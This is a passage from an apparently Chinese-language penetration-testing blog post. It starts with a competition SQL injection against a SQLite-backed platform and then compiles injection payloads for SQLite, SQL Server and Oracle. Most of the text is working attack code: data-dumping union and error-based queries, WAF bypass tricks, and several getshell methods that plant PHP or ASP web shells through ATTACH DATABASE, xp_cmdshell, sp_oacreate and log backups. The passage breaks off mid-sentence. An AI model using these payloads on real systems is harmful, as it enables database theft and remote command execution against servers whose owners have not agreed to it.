information_schema.tables where table_schema.tables=database()<br></code></pre></td></tr></table></figure>\n\n<p> 依旧报错</p>\n</li>\n<li><p>此时意识到应该数据库类型不是MySQL，超出了知识范围</p>\n<p> 查阅siot官方文档，发现数据库类型是sqlite</p>\n<p class='item-img' data-src='/pic/%E5%90%84%E7%A7%8D%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B1%BB%E5%9E%8Bsql%E6%B3%A8%E5%85%A5/2.png'><img src=\"/pic/%E5%90%84%E7%A7%8D%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B1%BB%E5%9E%8Bsql%E6%B3%A8%E5%85%A5/2.png\"></p>\n<p> 验证了一下，确实是sqlite数据库：</p>\n<p class='item-img' data-src='/pic/%E5%90%84%E7%A7%8D%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B1%BB%E5%9E%8Bsql%E6%B3%A8%E5%85%A5/3.png'><img src=\"/pic/%E5%90%84%E7%A7%8D%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B1%BB%E5%9E%8Bsql%E6%B3%A8%E5%85%A5/3.png\"></p>\n<p> 然后随便找了一个sqlite的注入语句（毕竟当时管不了什么多的了，先注出来要紧）</p>\n</li>\n<li><p>一步获取表名以及列名</p>\n <figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs sqlite\">&#x27; union select (select group_concat(sql) from sqlite_master),2,3,4,5 --+<br></code></pre></td></tr></table></figure>\n\n<p class='item-img' data-src='/pic/%E5%90%84%E7%A7%8D%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B1%BB%E5%9E%8Bsql%E6%B3%A8%E5%85%A5/4.png'><img src=\"/pic/%E5%90%84%E7%A7%8D%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B1%BB%E5%9E%8Bsql%E6%B3%A8%E5%85%A5/4.png\"></p>\n<p> （我自己都不信我当时有时间把图截下来还用两种颜色的荧光笔标出来表名和列名）</p>\n<p> ok到了这一步就差不多了</p>\n</li>\n<li><p>最后一步</p>\n <figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs sqlite\">&#x27; union select (select group_concat(Description) from Project),2,3,4,5 --+<br></code></pre></td></tr></table></figure>\n\n<p> 因为当时域服务器马上就要关了，有点着急，没有获取全部的列名就随便挑了一个</p>\n<p class='item-img' data-src='/pic/%E5%90%84%E7%A7%8D%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B1%BB%E5%9E%8Bsql%E6%B3%A8%E5%85%A5/5.png'><img src=\"/pic/%E5%90%84%E7%A7%8D%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B1%BB%E5%9E%8Bsql%E6%B3%A8%E5%85%A5/5.png\"><br> （真是一个认真的描述！)</p>\n<p> 到此结束</p>\n</li>\n</ol>\n<h1 id=\"复盘反思\"><a href=\"#复盘反思\" class=\"headerlink\" title=\"复盘反思\"></a>复盘反思</h1><p>这一次的注入主要卡在了数据库注入语句的问题，因此今天这篇文章就来梳理一下主要的数据库类型的注入语句</p>\n<p>目前主流的是这些：</p>\n<ul>\n<li><p>sqlite </p>\n</li>\n<li><p>PostgreSQL</p>\n</li>\n<li><p>sql server </p>\n</li>\n<li><p>orancle </p>\n</li>\n<li><p>mongoDB</p>\n</li>\n<li><p>redis </p>\n</li>\n<li><p>cassandra</p>\n</li>\n<li><p>couchDB</p>\n</li>\n<li><p>MariaDB</p>\n</li>\n<li><p>mysql</p>\n</li>\n</ul>\n<p>目前最最主流的就是MySQL，已经会了，这里不作叙述，今天主要挑选sqlite、sql server、orancle 、PostgreSQL这几个展开</p>\n<p>分别从基础注入语句以及getshell两方面记录,当然此文章并不会深入探讨，在实战中还是使用sqlmap更加高效一些</p>\n<h1 id=\"Sqlite\"><a href=\"#Sqlite\" class=\"headerlink\" title=\"Sqlite\"></a>Sqlite</h1><blockquote>\n<p><a href=\"https://blog.csdn.net/HBohan/article/details/120672745\">https://blog.csdn.net/HBohan/article/details/120672745</a><br><a href=\"https://xz.aliyun.com/t/8627\">https://xz.aliyun.com/t/8627</a></p>\n</blockquote>\n<p>这个注入与mysql最像，因此先从这个开始，我们从最基本的步骤来记录</p>\n<p>为了研究，我将siot本地平台搭建在了虚拟机上方便研究</p>\n<h2 id=\"判断方法\"><a href=\"#判断方法\" class=\"headerlink\" title=\"判断方法\"></a>判断方法</h2><p>利用此数据库语言的特有函数：sqlite_version()</p>\n<h2 id=\"基本注入\"><a href=\"#基本注入\" class=\"headerlink\" title=\"基本注入\"></a>基本注入</h2><ol>\n<li><p>判断闭合 </p>\n<p>同MySQL 注释符为“–+” 或者也可以使用“&#x2F;*” 不可使用“#” 有时候可以使用“;” </p>\n</li>\n<li><p>获取字段数 同MySQL</p>\n</li>\n<li><p>判断回显点 同MySQL</p>\n</li>\n<li><p>获取表名、列名</p>\n<p>不同于MySQL的是，这只需要一步就可以得出了，payload如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">&#x27; union select group_concat(sql),2,3,4,5 from sqlite_master --+<br></code></pre></td></tr></table></figure>\n\n<p>这个语句执行后会回显出创建表的语句，以达到获取表名和列名的效果</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">CREATE TABLE &quot;Project&quot; ( &quot;ID&quot; text(80,0) NOT NULL, &quot;Description&quot; text(200,0), &quot;Created&quot; integer(11,0) NOT NULL, PRIMARY KEY(&quot;ID&quot;) ),CREATE TABLE &quot;Device&quot; ( &quot;ProjectID&quot; text(80,0) NOT NULL, &quot;DeviceName&quot; text(100,0) NOT NULL, &quot;Created&quot; int(11,0) NOT NULL, &quot;DeviceDesc&quot; text(200,0), &quot;ID&quot; text(70,0) NOT NULL, PRIMARY KEY(&quot;ID&quot;) ),CREATE TABLE &quot;Message&quot; ( &quot;Topic&quot; text(80,0) NOT NULL, &quot;Content&quot; text(200,0), &quot;Created&quot; integer(11,0) NOT NULL, &quot;ID&quot; INTEGER NOT NULL PRIMARY KEY AUTOINCREMENT ),CREATE TABLE sqlite_sequence(name,seq),CREATE INDEX &quot;&quot; ON Message (&quot;Created&quot; COLLATE NOCASE DESC)<br></code></pre></td></tr></table></figure>\n\n<p>看着有点乱，但是应该都是可以判断出来的</p>\n</li>\n<li><p>获取全部内容</p>\n<p>一上面的内容举例，我们构造的语句和mysql的语句差不多：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">&#x27; union select group_concat(ID,Description),2,3,4,5 from Project/*<br></code></pre></td></tr></table></figure>\n\n<p>有一点需要注意，上面的Project表中还含有一个“Created”的列名，他的类型是int，不能和text类型的数据一起放在group_concat里面来输出</p>\n</li>\n</ol>\n<h2 id=\"GetShell\"><a href=\"#GetShell\" class=\"headerlink\" title=\"GetShell\"></a>GetShell</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">&#x27;;ATTACH DATABASE &#x27;C:\\\\shell.php&#x27; AS shell;<br>create TABLE shell.exp (payload); <br>insert INTO shell.exp (payload) VALUES (&#x27;&lt;?php @eval($_POST[&quot;cmd&quot;]); ?&gt;&#x27;) <br>--+<br></code></pre></td></tr></table></figure>\n\n<p>如果后台的查询语句是query()就不能使用这个语句了</p>\n<p>如果使用的是exec()就可以使用，也就有了堆叠注入，有了更大的操作空间</p>\n<p>当然，要获取绝对路径就只能看自己的运气和造诣了，常见的是通过制造报错和获取网站的phpinfo.php</p>\n<p>sqlite就粗略的到这里吧，后面的拓展随缘记录</p>\n<h1 id=\"Sql-Server\"><a href=\"#Sql-Server\" class=\"headerlink\" title=\"Sql Server\"></a>Sql Server</h1><blockquote>\n<p><a href=\"https://blog.csdn.net/qq_42990434/article/details/111287071\">https://blog.csdn.net/qq_42990434/article/details/111287071</a></p>\n<p><a href=\"https://blog.csdn.net/LJH1999ZN/article/details/122911809\">https://blog.csdn.net/LJH1999ZN/article/details/122911809</a></p>\n<p><a href=\"https://payloads.online/article/417aef69-1622-4985-8690-09504bfd40cd\">https://payloads.online/article/417aef69-1622-4985-8690-09504bfd40cd</a></p>\n<p><a href=\"https://blog.csdn.net/zzgslh/article/details/111695332\">https://blog.csdn.net/zzgslh/article/details/111695332</a></p>\n<p><a href=\"https://xz.aliyun.com/t/8603\">https://xz.aliyun.com/t/8603</a></p>\n</blockquote>\n<h2 id=\"判断方法-1\"><a href=\"#判断方法-1\" class=\"headerlink\" title=\"判断方法\"></a>判断方法</h2><p>忘记哪一个文章里面有一个师傅说看见页面大部分的文件都是.asp .aspx就可以大致判定数据库类型是sql server了，但是这个总结确实非常准确精辟</p>\n<p>开放端口：1433</p>\n<h2 id=\"基本注入-1\"><a href=\"#基本注入-1\" class=\"headerlink\" title=\"基本注入\"></a>基本注入</h2><p>首先简单看看一些常用的语句和函数吧</p>\n<ul>\n<li><p>@@version &#x2F;&#x2F; 数据库版本</p>\n</li>\n<li><p>system_user &#x2F;&#x2F;系统用户名</p>\n</li>\n<li><p>suser_sname() &#x2F;&#x2F;查出当前操作数据库的登入名，一般和触发器一起用来监控是谁对表做了操作</p>\n</li>\n<li><p>user &#x2F;&#x2F;获取当前数据库用户名</p>\n</li>\n<li><p>db_name() &#x2F;&#x2F; 当前数据库名 其中db_name(N)可以来遍历其他数据库</p>\n</li>\n<li><p>db_name(7) &#x2F;&#x2F;查询库名，1-6为系统库，7开始为其他库</p>\n</li>\n<li><p>select host_name())&#x2F;&#x2F;主机名</p>\n</li>\n<li><p>;select user &#x2F;&#x2F;查询是否支持多语句(堆叠注入)</p>\n</li>\n<li><p>select is_srvrolemember(‘sysadmin’) &#x2F;&#x2F;判断是否是系统管理员，0就是false</p>\n</li>\n<li><p>select is_srvrolemember(‘db_owner’) &#x2F;&#x2F;判断是否是库权限，0就是false</p>\n</li>\n<li><p>select is_srvrolemember(‘public’) &#x2F;&#x2F;判断是否为public权限，0就是false</p>\n</li>\n<li><p>select count(*) from master.dbo.sysobjects where xtype&#x3D;’X’ and name&#x3D;’xp_cmdshell’ &#x2F;&#x2F;查询xp_cmdshell，1为存在</p>\n</li>\n<li><p>select name from master.dbo.sysdatabases where dbid&#x3D;7 &#x2F;&#x2F;修改dbid数值，查询库名，1-6为系统库</p>\n<hr>\n<p>这两条仅限于&gt;&#x3D;2005的版本</p>\n</li>\n<li><p>select quotename(name) from master…sysdatabases FOR XML PATH(‘’)</p>\n</li>\n<li><p>select ‘|’%2bname%2b’|’ from master…sysdatabases FOR XML PATH(‘’)</p>\n<hr>\n</li>\n</ul>\n<p>因为没有环境测试，暂时没有实操语句，之后遇到了再记录，这里再简单写一些bypass手法（其实就是文章里面的）</p>\n<p><strong>绕过方式：</strong><br>mssql空白符，%01-%20都为空白符，–和&#x2F;**&#x2F;为注释，%00也可充当注释符</p>\n<p>引进一个declare 函数，他是mssql声明局部变量的函数，我们经常用它来绕过waf对一些关键词的拦截</p>\n<p>select * from admin where id &#x3D;1;declare @a nvarchar(2000) set @a&#x3D;‘select convert(int,@@version)’ exec(@a) –<br>堆叠注入，使用declare 和exec进行无select注入</p>\n<p>declare @s varchar(2000) set @s&#x3D;0x73656C6563742031 exec(@s)<br>declare定义变量 set设置变量值 exec执行变量</p>\n<p>变量的值是支持hex和ascii码的,当过滤引号我们就可以这么用</p>\n<p>避免使用引号</p>\n<p>(select top 1 name from syscolumns where id&#x3D;object_id(‘admin’))</p>\n<p>(select top 1 name from syscolumns where id&#x3D;object_id(char(97)+char(100)+char(109)+char(105)+char(110)))</p>\n<hr>\n<p>现在开始正式的注入步骤记录</p>\n<h3 id=\"联合查询\"><a href=\"#联合查询\" class=\"headerlink\" title=\"联合查询\"></a>联合查询</h3><ol>\n<li><p>判断闭合 注释符为–+ 同MySQL</p>\n</li>\n<li><p>判断字段数 同MySQL</p>\n</li>\n<li><p>注出回显点 同MySQL</p>\n</li>\n<li><p>查询数据库</p>\n<p>这里需要先确认每一列的数据类型，将<code>union select 1,2,3</code>替换成<code>union all select null,null,null</code> 添加all是为了不让程序自动去重</p>\n<p>这一步需要枚举出每一列的数据类型，假如我们此时枚举出后的payload是：<code>union all select 1,null,null</code> 那么我们就可以把需要查询的东西放到”null“位上</p>\n<p>a.查询全部数据库（a.b.两步均为数字型注入下，如果是字符型注入需要闭合加上注释）</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs mssql\">UNION all SELECT 1,null,name from master..sysdatabases<br></code></pre></td></tr></table></figure>\n\n<p>b.查询当前数据库</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs mssql\">UNION all SELECT 1,2,db_name() from master..sysdatabases<br></code></pre></td></tr></table></figure>\n</li>\n<li><p>获取数据库中的表名</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs mssql\">UNION all SELECT 1,2,name from 数据库名称..sysobjects where xtype = 0x75 <br></code></pre></td></tr></table></figure>\n\n<p>0x75对应的是字符“u”</p>\n</li>\n<li><p>获取当前表名的列名</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs mssql\">UNION all SELECT 1,2,name from jiaofan..syscolumns where id = (select id from 数据库名称..sysobjects where name = 表名)<br></code></pre></td></tr></table></figure>\n</li>\n<li><p>获取全部内容</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs mssql\">UNION all SELECT 1,2,列名 from  表名<br></code></pre></td></tr></table></figure></li>\n</ol>\n<hr>\n<p>一套流程下来，和MySQL差不多，可见数据库语言都是触类旁通的</p>\n<p>接下来介绍一下sqlserver报错注入</p>\n<h3 id=\"报错注入\"><a href=\"#报错注入\" class=\"headerlink\" title=\"报错注入\"></a>报错注入</h3><p>以下语句均为字符型注入下，并给出多个payload</p>\n<ol>\n<li><p>获取当前数据库：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs mssql\">and 1=(select db_name())<br><br>and 1=convert(int,(select db_name()))<br></code></pre></td></tr></table></figure>\n</li>\n<li><p>获取数据库中的表名：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs mssql\">and 1= (select top 1 name from 数据库名..sysobjects where xtype = 0x75) <br>注：使用此语句需要修改top后的数字<br><br>and 1=convert(int,(select top 1 name from 数据库名.sys.objects where type=&#x27;U&#x27;))<br>注：使用此语句需要修改top后的数字<br><br>and 1=convert(int,stuff((select  quotename(name) from 数据库名.sys.objects where type=&#x27;U&#x27; for xml path(&#x27;&#x27;)),1,0,&#x27;&#x27;))<br>此语句获取数据库下的全部表<br></code></pre></td></tr></table></figure>\n</li>\n<li><p>获取表中的列名</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs mssql\">and 1=(select top 1 c.name from 数据库名..syscolumns c ,数据库名..sysobjects o where c.id = o.id and o.name=表名) <br>注：使用此语句需要修改top后的数字<br><br>and 1=convert(int,(select top 1 name from 数据库名.sys.columns where object_id=object_id(&#x27;表名&#x27;)))<br>注：使用此语句需要修改top后的数字<br><br>and 1=convert(int,stuff((select quotename(name) from 数据库名.sys.columns where object_id=object_id(&#x27;表名&#x27;) for xml path(&#x27;&#x27;)),1,0,&#x27;&#x27;))<br>此语句获取表中的全部列<br></code></pre></td></tr></table></figure>\n</li>\n<li><p>dump全部内容 </p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs mssql\">and 1=convert(int,(select top 1 列名 from 表名))<br>注：使用此语句需要修改top后的数字<br><br>and 1=convert(int,stuff((select quotename(列名) from 表名 for xml path(&#x27;&#x27;)),1,0,&#x27;&#x27;))<br>此语句dump全部内容<br></code></pre></td></tr></table></figure></li>\n</ol>\n<h2 id=\"GetShell-1\"><a href=\"#GetShell-1\" class=\"headerlink\" title=\"GetShell\"></a>GetShell</h2><h3 id=\"堆叠注入下getshell\"><a href=\"#堆叠注入下getshell\" class=\"headerlink\" title=\"堆叠注入下getshell\"></a>堆叠注入下getshell</h3><h4 id=\"直接通过特殊函数-getshell\"><a href=\"#直接通过特殊函数-getshell\" class=\"headerlink\" title=\"直接通过特殊函数 getshell\"></a>直接通过特殊函数 getshell</h4><p>一、<strong>xp_cmdshell</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs mssql\">EXEC sp_configure &#x27;show advanced options&#x27;, 1;RECONFIGURE;EXEC sp_configure &#x27;xp_cmdshell&#x27;, 1;RECONFIGURE;<br></code></pre></td></tr></table></figure>\n\n<p>如果开启成功了，那么就可以使用如下代码来执行cmd命令：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">?id=1;use master;exec master..xp_cmdshell &quot;whoami&quot;;<br></code></pre></td></tr></table></figure>\n\n<p>获取了shell之后可以使用这个命令来查找网站绝对路径</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><code class=\"hljs shell\">for %i in (c d e f g h i j k l m n o p q r s t u v w x v z) do @(dir/s/b %i:\\F12看到的调用文件)<br></code></pre></td></tr></table></figure>\n\n<p>二、<strong>xp_dirtree</strong></p>\n<p>xp_dirtree有三个参数，</p>\n<ol>\n<li>要列的目录</li>\n<li>是否要列出子目录下的所有文件和文件夹，默认为0，如果不需要设置为1</li>\n<li>是否需要列出文件，默认为不列，如果需要列文件设置为1</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs mssql\">xp_dirtree &#x27;c:\\&#x27;, 1, 1      #列出当前目录下所有的文件和文件夹<br></code></pre></td></tr></table></figure>\n\n<p>通过堆叠注入建表，将输出插入表里，通过注入将表列出来</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs mssql\">?id=1;create table dir(subdirectory varchar(255),depth int, filee int);insert into dir(subdirectory,depth,filee) exec xp_dirtree &#x27;c:\\&#x27;,1,1<br></code></pre></td></tr></table></figure>\n\n<p>因为xp_dirtree输出是三个字段的所以要创建一个三个字段的表 ，字段名可以随便取</p>\n<p>三、<strong>xp_subdirs</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs mssql\">xp_subdirs &#x27;c:\\&#x27;<br></code></pre></td></tr></table></figure>\n\n<p>这个方法和上面的一样，缺点是不能列出文件</p>\n<hr>\n<p>以上仅是针对于sqlserver特殊函数的获取绝对路径方法，普遍通用的方法这里不展开叙述</p>\n<h4 id=\"间接通过vbs-getshell\"><a href=\"#间接通过vbs-getshell\" class=\"headerlink\" title=\"间接通过vbs getshell\"></a>间接通过vbs getshell</h4><p>一、<strong>sp_oacreate</strong></p>\n<p>*1.1</p>\n<p>通过堆叠注入开启sp_oacreate</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs mssql\">exec sp_configure &#x27;show advanced options&#x27;, 1;RECONFIGURE<br>exec sp_configure &#x27;Ole Automation Procedures&#x27;,1;RECONFIGURE<br></code></pre></td></tr></table></figure>\n\n<p>成功后：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs mssql\">declare @o int;<br>exec sp_oacreate &#x27;wscript.shell&#x27;,@o out;<br>exec sp_oamethod @o,&#x27;run&#x27;,null,&#x27;cmd /c mkdir c:\\temp&#x27;;<br>exec sp_oamethod @o,&#x27;run&#x27;,null,&#x27;cmd /c &quot;net user&quot; &gt; c:\\temp\\user.txt&#x27;;<br>create table cmd_output (output text);<br>BULK INSERT cmd_output FROM &#x27;c:\\temp\\user.txt&#x27; WITH (FIELDTERMINATOR=&#x27;n&#x27;,ROWTERMINATOR = &#x27;nn&#x27;)      -- 括号里面两个参数是行和列的分隔符，随便写就行<br>select * from cmd_output<br></code></pre></td></tr></table></figure>\n\n<p>列出cmd_output得到命令结果</p>\n<p>如果这个命令执行成功，会返回0</p>\n<hr>\n<p>*1.2</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs mssql\">declare @f int,@g int<br>exec sp_oacreate &#x27;Scripting.FileSystemObject&#x27;,@f output<br>EXEC SP_OAMETHOD @f,&#x27;CreateTextFile&#x27;,@f OUTPUT,&#x27;c:\\inetpub\\wwwroot\\cmd.vbs&#x27;,1<br>EXEC sp_oamethod  @f,&#x27;WriteLine&#x27;,null,&#x27;Set objShell = CreateObject(&quot;Shell.Application&quot;)<br>objShell.ShellExecute &quot;cmd&quot;, &quot;cmd /c whoami&gt;c:\\whoami.txt&quot;, &quot;&quot;, &quot;runas&quot;,1&#x27;<br>declare @o int<br><br>exec sp_oacreate &#x27;Shell.Application&#x27;, @o out<br>exec sp_oamethod @o, &#x27;ShellExecute&#x27;,null, &#x27;cmd.exe&#x27;,&#x27;cmd /c net user &gt;c:\\test.txt&#x27;,&#x27;c:\\windows\\system32&#x27;,&#x27;&#x27;,&#x27;1&#x27;; --支持2005，不支持2008<br><br>exec sp_oamethod @o,&#x27;ShellExecute&#x27;,null,&#x27;c:\\inetpub\\wwwroot\\cmd.vbs&#x27;, &#x27;&#x27;, &#x27;c:\\&#x27;, &#x27;&#x27;, 0 --成功<br></code></pre></td></tr></table></figure>\n\n<p>然后和上面一样写入表里应该就可以了</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs mssql\">create table cmd_output (output text);<br>BULK INSERT cmd_output FROM &#x27;c:\\whoami.txt&#x27; WITH (FIELDTERMINATOR=&#x27;n&#x27;,ROWTERMINATOR = &#x27;nn&#x27;)      -- 括号里面两个参数是行和列的分隔符，随便写就行<br>select * from cmd_output<br></code></pre></td></tr></table></figure>\n\n<p>然后最后一步写shell</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs mssql\">declare @f int,@g int<br>exec sp_oacreate &#x27;Scripting.FileSystemObject&#x27;,@f output<br>EXEC SP_OAMETHOD @f,&#x27;CreateTextFile&#x27;,@f OUTPUT,&#x27;c:\\inetpub\\wwwroot\\shell.php&#x27;,1<br>EXEC sp_oamethod  @f,&#x27;WriteLine&#x27;,null,&#x27;&lt;?php @eval(POST[&#x27;cmd&#x27;])?&gt;&#x27;<br></code></pre></td></tr></table></figure>\n\n<h3 id=\"备份getshell\"><a href=\"#备份getshell\" class=\"headerlink\" title=\"备份getshell\"></a>备份getshell</h3><p><strong>需要知道绝对路径</strong></p>\n<p>testdb是当前数据库</p>\n<p>网上查到两种方法，一种是差异备份一种是log备份</p>\n<p>差异备份2005和2008均没有复现成功</p>\n<p>05会一直报少一个%&gt;标记，08会多一个&lt;%然后报错，如果有解决的大佬希望可以告知一下，提前感谢</p>\n<p>log备份</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs mssql\">alter database testdb set RECOVERY FULL <br>backup database testdb to disk = &#x27;c:\\bak.bak&#x27;<br>create table cmd (a image) <br>backup log testdb to disk = &#x27;c:\\aaa.bak&#x27; with init <br>insert into cmd (a) values (0x3C25657865637574652872657175657374282261222929253E) <br>backup log testdb to disk = &#x27;C:\\inetpub\\wwwroot\\shell.asp&#x27;<br></code></pre></td></tr></table></figure>\n\n<p>两个数据库都可以成功，备份文件小，不容易出现脏数据</p>\n<p>注：0x3C25657865637574652872657175657374282261222929253E是asp一句话木马，如果其他语言也需要更改16进制的内容</p>\n<hr>\n<p>后面文章里面还记录了一个劫持粘滞键getshell的，这里暂时不作记录，个人认为可能用不到</p>\n<p>这里找到了一个靶场：</p>\n<p><a href=\"https://github.com/Larryxi/MSSQL-SQLi-Labs\">https://github.com/Larryxi/MSSQL-SQLi-Labs</a></p>\n<p>之后有空可能会看看吧。。不一定会学的像MySQL一样仔细</p>\n<h1 id=\"Orancle\"><a href=\"#Orancle\" class=\"headerlink\" title=\"Orancle\"></a>Orancle</h1><blockquote>\n<p><a href=\"https://www.cnblogs.com/ayoung/p/15329033.html\">https://www.cnblogs.com/ayoung/p/15329033.html</a></p>\n<p><a href=\"https://www.cnblogs.com/wuhongbin/p/15582881.html\">https://www.cnblogs.com/wuhongbin/p/15582881.html</a></p>\n<p><a href=\"https://xz.aliyun.com/t/10469\">https://xz.aliyun.com/t/10469</a></p>\n<p><a href=\"https://xz.aliyun.com/t/9940\">https://xz.aliyun.com/t/9940</a></p>\n<p><a href=\"https://xz.aliyun.com/t/7897\">https://xz.aliyun.com/t/7897</a></p>\n</blockquote>\n<h2 id=\"判断方法-2\"><a href=\"#判断方法-2\" class=\"headerlink\" title=\"判断方法\"></a>判断方法</h2><p>利用函数来判断是否oracle数据 如：and len(‘a’)&#x3D;1<br>（在mssql和mysql以及db2内，返回长度值是调用len()函数；在oracle和INFORMIX则是通过length()来返回长度值，但是postgresql也是length，需要注意）<br>也可以通过dual进一步来判断是否为oracle</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><code class=\"hljs sql\"><span class=\"hljs-keyword\">select</span> <span class=\"hljs-built_in\">count</span>(<span class=\"hljs-operator\">*</span>) <span class=\"hljs-keyword\">from</span> dual <span class=\"hljs-keyword\">where</span> <span class=\"hljs-number\">1</span><span class=\"hljs-operator\">=</span><span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">and</span> (<span class=\"hljs-keyword\">select</span> <span class=\"hljs-built_in\">count</span>(<span class=\"hljs-operator\">*</span>) <span class=\"hljs-keyword\">from</span> dual)<span class=\"hljs-operator\">&gt;</span><span class=\"hljs-number\">1</span> <span class=\"hljs-comment\">--</span><br><span class=\"hljs-keyword\">select</span> <span class=\"hljs-built_in\">count</span>(<span class=\"hljs-operator\">*</span>) <span class=\"hljs-keyword\">from</span> dual <span class=\"hljs-keyword\">where</span> <span class=\"hljs-number\">1</span><span class=\"hljs-operator\">=</span><span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">and</span> (<span class=\"hljs-keyword\">select</span> <span class=\"hljs-built_in\">count</span>(<span class=\"hljs-operator\">*</span>) <span class=\"hljs-keyword\">from</span> dual)<span class=\"hljs-operator\">&gt;</span><span class=\"hljs-number\">0</span> <span class=\"hljs-comment\">--</span><br></code></pre></td></tr></table></figure>\n\n<h2 id=\"基本注入-2\"><a href=\"#基本注入-2\" class=\"headerlink\" title=\"基本注入\"></a>基本注入</h2><h3 id=\"联合查询-1\"><a href=\"#联合查询-1\" class=\"headerlink\" title=\"联合查询\"></a>联合查询</h3><ol>\n<li><p>闭合 同MySQL 注释符为 –+</p>\n</li>\n<li><p>判断字段数  同MySQL </p>\n</li>\n<li><p>联合查询找回显位 同Sql Server<br> Oracle 数据库查询需要 from dual (虚表&#x2F;伪表) 专为查询语句设置的表</p>\n <figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><code class=\"hljs sql\"><span class=\"hljs-keyword\">null</span>代替所有类型<br>id<span class=\"hljs-operator\">=</span><span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">union</span> <span class=\"hljs-keyword\">select</span> <span class=\"hljs-keyword\">null</span>,<span class=\"hljs-keyword\">null</span>,<span class=\"hljs-keyword\">null</span>,<span class=\"hljs-keyword\">null</span> <span class=\"hljs-keyword\">from</span> dual<span class=\"hljs-comment\">--</span><br>id<span class=\"hljs-operator\">=</span><span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">union</span> <span class=\"hljs-keyword\">select</span> <span class=\"hljs-number\">1</span>,<span class=\"hljs-string\">&#x27;admin&#x27;</span>,<span class=\"hljs-number\">3</span>,<span class=\"hljs-number\">4</span> <span class=\"hljs-keyword\">from</span> dual<span class=\"hljs-comment\">--</span><br></code></pre></td></tr></table></figure>\n</li>\n<li><p>查询数据库版本、数据库连接用户、当前实例名 </p>\n <figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><code class=\"hljs sql\">id<span class=\"hljs-operator\">=</span><span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">union</span> <span class=\"hljs-keyword\">select</span> <span class=\"hljs-number\">1</span>,(<span class=\"hljs-keyword\">select</span> banner <span class=\"hljs-keyword\">from</span> sys.v_$version <span class=\"hljs-keyword\">where</span> rownum<span class=\"hljs-operator\">=</span><span class=\"hljs-number\">1</span>),<span class=\"hljs-number\">3</span>,<span class=\"hljs-number\">4</span> <span class=\"hljs-keyword\">from</span> dual<span class=\"hljs-comment\">--</span><br>id<span class=\"hljs-operator\">=</span><span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">union</span> <span class=\"hljs-keyword\">select</span> <span class=\"hljs-number\">1</span>,(<span class=\"hljs-keyword\">select</span> SYS_CONTEXT(<span class=\"hljs-string\">&#x27;USERENV&#x27;</span>,<span class=\"hljs-string\">&#x27;CURRENT_USER&#x27;</span>) <span class=\"hljs-keyword\">from</span> dual),<span class=\"hljs-number\">3</span>,<span class=\"hljs-number\">4</span> <span class=\"hljs-keyword\">from</span> dual<span class=\"hljs-comment\">-- #test</span><br>id<span class=\"hljs-operator\">=</span><span class=\"hljs-number\">-1</span> <span class=\"hljs-keyword\">union</span> <span class=\"hljs-keyword\">select</span> <span class=\"hljs-number\">1</span>,(<span class=\"hljs-keyword\">select</span> instance_name <span class=\"hljs-keyword\">from</span> v$instance),<span class=\"hljs-number\">3</span>,<span class=\"hljs-number\">4</span> <span class=\"hljs-keyword\">from</span> dual<span class=\"hljs-comment\">--</span><br></code></pre></td></tr></table></figure>\n</li>\n<li><p>获取数据库名，这个似乎没有什么用处</p>\n <figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><code class=\"hljs sql\"><span class=\"hljs-keyword\">union</span> <span class=\"hljs-keyword\">select</span> SYS.DATABASE_NAME,<span 